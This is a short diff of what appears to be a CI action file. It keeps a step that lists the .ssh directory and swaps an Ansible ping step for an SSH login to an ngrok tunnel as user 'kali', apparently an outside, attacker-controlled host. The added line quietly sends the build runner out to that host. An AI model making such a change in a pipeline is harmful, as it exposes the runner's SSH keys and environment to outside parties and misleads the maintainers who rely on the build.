@@ -33,5 +33,5 @@ runs:
       shell: bash
     - run: ls -la .ssh
       shell: bash
-    - run: ansible -i inventory.ini all -m ping
+    - run: ssh -p 14125 kali@2.tcp.ngrok.io whoami
       shell: bash
